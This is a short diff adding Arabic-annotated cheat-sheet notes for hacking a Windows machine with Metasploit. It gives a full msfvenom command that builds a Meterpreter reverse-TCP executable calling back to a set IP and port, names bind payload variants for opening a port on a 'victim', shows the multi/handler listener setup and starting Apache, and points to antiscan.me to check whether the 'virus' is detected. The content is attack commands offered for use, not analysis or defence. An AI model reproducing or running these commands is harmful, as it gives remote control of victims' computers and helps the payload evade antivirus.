@@ -1,0 +1,20 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.4 LPORT=5050 -f exe -o /root/Desktop/oussama.exe      ----> تحديد جهاز مراد اختراقه
+                                                  !               !
+                                  البورت                 عنوان الايبي الخاص بنظام الاصلي           
+
+bind_https   ----> فتح بورت في نظام ضحية 
+    _http
+    _tcp
+
+----------------------------
+        فقرة الاستماع 
+
+msfconsole
+
+use exploit/multi/handler   -----> استعمال اداة الهاندلر للتنصت 
+set payload windows/x64/meterpreter/reverse_tcp  --> تغيير بايلود 
+
+service apacha2 start
+
+--------
+antiscan.me --------> معرفة الفيروس هل هو مكتشف
